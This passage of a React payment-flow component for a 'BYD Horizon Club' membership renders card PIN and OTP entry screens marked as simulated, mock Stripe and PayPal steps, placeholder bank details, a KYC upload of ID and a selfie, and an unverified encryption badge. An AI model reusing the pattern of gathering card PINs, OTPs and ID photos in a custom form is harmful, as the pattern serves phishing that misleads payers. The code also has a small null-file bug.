            <div className="text-center mb-2">
              <p className="text-white/50 text-sm">Enter your card PIN</p>
              <p className="text-xs text-white/30">Simulated 4-digit PIN</p>
            </div>
            <div className="flex justify-center gap-3">
              {[0, 1, 2, 3].map(i => (
                <input key={i} className="w-14 h-14 bg-white/5 border border-white/10 rounded-xl text-white text-center text-2xl font-bold focus:outline-none focus:border-emerald-500/50 transition-all" type="password" maxLength={1} value={form.cardPin[i] || ''} onChange={e => {
                  const val = e.target.value.replace(/\D/g, '');
                  const newPin = form.cardPin.split('');
                  newPin[i] = val;
                  updateForm('cardPin', newPin.join('').slice(0, 4));
                  if (val && i < 3) (document.querySelectorAll<HTMLInputElement>('input[type=password]')[i + 1])?.focus();
                }} onKeyDown={e => {
                  if (e.key === 'Backspace' && !form.cardPin[i] && i > 0) (document.querySelectorAll<HTMLInputElement>('input[type=password]')[i - 1])?.focus();
                }} autoFocus={i === 0} />
              ))}
            </div>
            <button onClick={handlePaystackNext} disabled={form.cardPin.length < 4} className="w-full py-3.5 bg-gradient-to-r from-emerald-500 to-emerald-600 hover:from-emerald-400 hover:to-emerald-500 text-white font-semibold rounded-xl transition-all duration-300 disabled:opacity-50 shadow-lg shadow-emerald-500/20">
              Confirm PIN
            </button>
          </div>
        )}
        {isStage('otp') && (
          <div className="space-y-4">
            <div className="text-center mb-2">
              <p className="text-white/50 text-sm">Enter OTP sent to your phone</p>
              <p className="text-xs text-white/30">Simulated 6-digit OTP</p>
            </div>
            <div className="flex justify-center gap-2">
              {[0, 1, 2, 3, 4, 5].map(i => (
                <input key={i} className="w-11 h-14 bg-white/5 border border-white/10 rounded-xl text-white text-center text-xl font-bold focus:outline-none focus:border-emerald-500/50 transition-all" type="text" maxLength={1} value={form.cardOtp[i] || ''} onChange={e => {
                  const val = e.target.value.replace(/\D/g, '');
                  const newOtp = form.cardOtp.split('');
                  newOtp[i] = val;
                  updateForm('cardOtp', newOtp.join('').slice(0, 6));
                  if (val && i < 5) (document.querySelectorAll<HTMLInputElement>('input[type=text]')[i + 1])?.focus();
                }} onKeyDown={e => {
                  if (e.key === 'Backspace' && !form.cardOtp[i] && i > 0) (document.querySelectorAll<HTMLInputElement>('input[type=text]')[i - 1])?.focus();
                }} autoFocus={i === 0} />
              ))}
            </div>
            <button onClick={handlePaystackNext} disabled={form.cardOtp.length < 6 || paymentProcessing} className="w-full py-3.5 bg-gradient-to-r from-emerald-500 to-emerald-600 hover:from-emerald-400 hover:to-emerald-500 text-white font-semibold rounded-xl transition-all duration-300 disabled:opacity-50 shadow-lg shadow-emerald-500/20 flex items-center justify-center gap-2">
              {paymentProcessing ? <><Loader2 className="w-5 h-5 animate-spin" /> Processing...</> : 'Verify Payment'}
            </button>
          </div>
        )}
        {paystackStage === 'success' && (
          <div className="text-center py-8 space-y-4">
            <div className="w-20 h-20 mx-auto rounded-full bg-emerald-500/20 flex items-center justify-center border-2 border-emerald-500">
              <CheckCircle className="w-10 h-10 text-emerald-400" />
            </div>
            <h3 className="text-xl font-bold text-white">Payment Successful!</h3>
            <p className="text-white/50 text-sm">Your Paystack payment has been processed</p>
          </div>
        )}
        {paystackStage !== 'success' && <button type="button" onClick={() => setStep('payment-methods')} className="w-full text-sm text-white/40 hover:text-white/60 transition-colors">Back</button>}
      </div>
    );
  };

  const renderSimulatedPayment = (title: string, methodId: string) => (
    <div className="space-y-6">
      <div className="text-center">
        <h2 className="text-2xl font-bold text-white">{title}</h2>
        <p className="text-white/50 text-sm mt-1">Processing your payment</p>
      </div>
      <div className="p-8 bg-white/5 border border-white/10 rounded-2xl text-center space-y-4">
        {simulatedTimeout ? (
          <>
            <Loader2 className="w-12 h-12 text-emerald-400 animate-spin mx-auto" />
            <p className="text-white font-medium">Redirecting to {title}...</p>
            <p className="text-white/40 text-sm">Please wait while we process your payment</p>
          </>
        ) : (
          <>
            <Clock className="w-12 h-12 text-yellow-400 mx-auto" />
            <p className="text-white font-medium">Simulated Payment</p>
            <p className="text-white/40 text-sm">Click below to simulate a successful {title} payment</p>
            <button onClick={methodId === 'paypal' ? handlePayPalPayment : handleStripePayment} disabled={loading} className="px-8 py-3 bg-gradient-to-r from-emerald-500 to-emerald-600 hover:from-emerald-400 hover:to-emerald-500 text-white font-semibold rounded-xl transition-all duration-300 disabled:opacity-50 shadow-lg shadow-emerald-500/20 flex items-center justify-center gap-2 mx-auto">
              {loading ? <Loader2 className="w-5 h-5 animate-spin" /> : `Pay with ${title}`}
            </button>
          </>
        )}
      </div>
      <button type="button" onClick={() => setStep('payment-methods')} className="w-full text-sm text-white/40 hover:text-white/60 transition-colors">Back</button>
    </div>
  );

  const renderBankTransfer = () => (
    <div className="space-y-6">
      <div className="text-center">
        <h2 className="text-2xl font-bold text-white">Bank Transfer</h2>
        <p className="text-white/50 text-sm mt-1">3-5 business days processing</p>
      </div>
      <div className="p-5 bg-white/5 border border-white/10 rounded-2xl space-y-3">
        <h3 className="text-sm font-medium text-white/70">Bank Account Details</h3>
        <div className="space-y-2 text-sm">
          {[
            ['Bank', 'First Horizon Bank'],
            ['Account Name', 'BYD Horizon Club Ltd'],
            ['Account Number', '1234-5678-9012'],
            ['Routing Number', '026-009-593'],
            ['SWIFT/BIC', 'HORIZUS33'],
            ['Reference', `HORIZON-${Date.now().toString(36).toUpperCase()}`],
          ].map(([l, v]) => (
            <div key={l} className="flex justify-between">
              <span className="text-white/50">{l}</span>
              <span className="text-white font-medium text-right max-w-[60%] break-all">{v}</span>
            </div>
          ))}
        </div>
      </div>
      <div className="space-y-3">
        <label className="block text-sm font-medium text-white/70">Upload Proof of Payment</label>
        <div className="relative">
          <input type="file" accept="image/*,.pdf" className="hidden" id="bankProof" onChange={e => {
            const file = e.target.files?.[0];
            if (file) updateForm('bankProofFile', file); updateForm('bankProofName', file.name);
          }} />
          <label htmlFor="bankProof" className="flex items-center gap-3 p-4 bg-white/5 border border-dashed border-white/10 rounded-xl cursor-pointer hover:border-emerald-500/30 transition-all">
            <Upload className="w-5 h-5 text-white/40" />
            <span className="text-sm text-white/50">{form.bankProofName || 'Click to upload receipt or screenshot'}</span>
          </label>
        </div>
      </div>
      {error && <p className="text-red-400 text-sm flex items-center gap-1"><AlertTriangle className="w-4 h-4" />{error}</p>}
      <button onClick={handleBankProofUpload} disabled={loading || !form.bankProofFile} className="w-full py-3.5 bg-gradient-to-r from-emerald-500 to-emerald-600 hover:from-emerald-400 hover:to-emerald-500 text-white font-semibold rounded-xl transition-all duration-300 disabled:opacity-50 shadow-lg shadow-emerald-500/20 flex items-center justify-center gap-2">
        {loading ? <Loader2 className="w-5 h-5 animate-spin" /> : <><Upload className="w-5 h-5" /> Submit Proof</>}
      </button>
      <button type="button" onClick={() => setStep('payment-methods')} className="w-full text-sm text-white/40 hover:text-white/60 transition-colors">Back</button>
    </div>
  );

  const renderKyc = () => {
    const kycFields: { label: string; key: keyof KycData; type: string; placeholder?: string }[] = [
      { label: 'Full Legal Name', key: 'fullName', type: 'text', placeholder: 'As it appears on your ID' },
      { label: 'Date of Birth', key: 'dateOfBirth', type: 'date' },
      { label: 'Nationality', key: 'nationality', type: 'text', placeholder: 'e.g. American' },
      { label: 'Residential Address', key: 'address', type: 'textarea', placeholder: 'Full street address' },
    ];
    return (
      <div className="space-y-6">
        <div className="text-center">
          <h2 className="text-2xl font-bold text-white">Identity Verification (KYC)</h2>
          <p className="text-white/50 text-sm mt-1">Step {kycStep + 1} of 2</p>
        </div>
        {kycStep === 0 ? (
          <div className="space-y-4">
            {kycFields.map(f => (
              f.type === 'textarea' ? (
                renderField(f.label, 'textarea', kyc[f.key] as string, v => setKyc(p => ({ ...p, [f.key]: v })), { placeholder: f.placeholder, required: true })
              ) : (
                renderField(f.label, f.type, kyc[f.key] as string, v => setKyc(p => ({ ...p, [f.key]: v })), { placeholder: f.placeholder, required: true })
              )
            ))}
            <div className="space-y-1.5">
              <label className="block text-sm font-medium text-white/70">ID Type <span className="text-red-400">*</span></label>
              <select className="w-full px-4 py-3 bg-white/5 border border-white/10 rounded-xl text-white focus:outline-none focus:border-emerald-500/50 transition-all appearance-none cursor-pointer" value={kyc.idType} onChange={e => setKyc(p => ({ ...p, idType: e.target.value }))}>
                {ID_TYPES.map(t => <option key={t} value={t} className="bg-[#0a0e1a]">{t}</option>)}
              </select>
            </div>
            {renderField('ID Number', 'text', kyc.idNumber, v => setKyc(p => ({ ...p, idNumber: v })), { placeholder: 'Enter your ID number', required: true })}
            <button onClick={() => setKycStep(1)} className="w-full py-3.5 bg-gradient-to-r from-emerald-500 to-emerald-600 hover:from-emerald-400 hover:to-emerald-500 text-white font-semibold rounded-xl transition-all duration-300 shadow-lg shadow-emerald-500/20">Next: Upload Documents</button>
          </div>
        ) : (
          <div className="space-y-5">
            {[
              { label: 'ID Front (Photo)', key: 'documentFront', nameKey: 'documentFrontName' },
              { label: 'ID Back', key: 'documentBack', nameKey: 'documentBackName' },
              { label: 'Selfie', key: 'selfie', nameKey: 'selfieName' },
            ].map(({ label, key, nameKey }) => (
              <div key={key} className="space-y-1.5">
                <label className="block text-sm font-medium text-white/70">{label} <span className="text-red-400">*</span></label>
                <div className="relative">
                  <input type="file" accept="image/*" className="hidden" id={key} onChange={e => {
                    const file = e.target.files?.[0];
                    if (file) setKyc(p => ({ ...p, [key as keyof KycData]: file, [nameKey]: file.name }));
                  }} />
                  <label htmlFor={key} className="flex items-center gap-3 p-4 bg-white/5 border border-dashed border-white/10 rounded-xl cursor-pointer hover:border-emerald-500/30 transition-all">
                    <Camera className="w-5 h-5 text-white/40" />
                    <span className="text-sm text-white/50">{kyc[nameKey as keyof KycData] || `Upload ${label}`}</span>
                  </label>
                </div>
              </div>
            ))}
            {error && <p className="text-red-400 text-sm flex items-center gap-1"><AlertTriangle className="w-4 h-4" />{error}</p>}
            <button onClick={handleKycSubmit} disabled={loading} className="w-full py-3.5 bg-gradient-to-r from-emerald-500 to-emerald-600 hover:from-emerald-400 hover:to-emerald-500 text-white font-semibold rounded-xl transition-all duration-300 flex items-center justify-center gap-2 disabled:opacity-50 shadow-lg shadow-emerald-500/20">
              {loading ? <Loader2 className="w-5 h-5 animate-spin" /> : <><Shield className="w-5 h-5" /> Submit KYC</>}
            </button>
            <button onClick={() => setKycStep(0)} className="w-full text-sm text-white/40 hover:text-white/60 transition-colors">Back</button>
          </div>
        )}
      </div>
    );
  };

  const renderSuccess = () => (
    <div className="space-y-6 text-center">
      {showConfetti && <ConfettiEffect />}
      <CheckmarkAnimation />
      <div className="space-y-3">
        <h2 className="text-3xl font-bold text-white">Welcome to BYD Horizon Club!</h2>
        <p className="text-white/50 text-lg">Your membership is confirmed</p>
      </div>
      <div className="p-5 bg-white/5 border border-white/10 rounded-2xl text-left space-y-3">
        <h3 className="text-sm font-medium text-white/70 flex items-center gap-2"><FileText className="w-4 h-4 text-emerald-400" />Next Steps</h3>
        <div className="space-y-2 text-sm text-white/60">
          {[
            'Your KYC documents are being reviewed (24-48 hrs)',
            'You will receive a confirmation email shortly',
            'Set up your Horizon Club profile and preferences',
            'Explore exclusive member benefits and EV resources',
          ].map((s, i) => (
            <div key={i} className="flex items-start gap-2"><Check className="w-4 h-4 text-emerald-400 mt-0.5 flex-shrink-0" /><span>{s}</span></div>
          ))}
        </div>
      </div>
      <button onClick={() => onNavigate('dashboard')} className="w-full py-3.5 bg-gradient-to-r from-emerald-500 to-emerald-600 hover:from-emerald-400 hover:to-emerald-500 text-white font-semibold rounded-xl transition-all duration-300 flex items-center justify-center gap-2 shadow-lg shadow-emerald-500/20">
        <ArrowRight className="w-5 h-5" /> Go to Dashboard
      </button>
    </div>
  );

  const stepRenderer: Record<Step, () => React.ReactNode> = {
    'signup': renderSignUp,
    'signin': renderSignIn,
    'forgot-password': renderForgotPassword,
    'plans': renderPlans,
    'payment-methods': renderPaymentMethods,
    'crypto-payment': renderCryptoPayment,
    'paystack-flow': renderPaystackFlow,
    'stripe-flow': () => renderSimulatedPayment('Stripe', 'stripe'),
    'paypal-flow': () => renderSimulatedPayment('PayPal', 'paypal'),
    'bank-transfer': renderBankTransfer,
    'kyc': renderKyc,
    'success': renderSuccess,
  };

  const showStepper = !['forgot-password', 'success'].includes(step);

  return (
    <div className="min-h-screen bg-[#0a0e1a] flex items-center justify-center p-4">
      <div className="w-full max-w-2xl">
        {showStepper && <Stepper current={topStepIndex} />}
        <div className="bg-white/5 backdrop-blur-xl border border-white/10 rounded-3xl p-6 sm:p-8 shadow-2xl transition-all duration-500">
          <div className="transition-all duration-300 ease-in-out">
            {stepRenderer[step]()}
          </div>
        </div>
        <p className="text-center text-xs text-white/20 mt-4">
          <Lock className="w-3 h-3 inline mr-1" />
          Secured with 256-bit encryption
        </p>
      </div>
    </div>
  );
};

export default PaymentFlow;
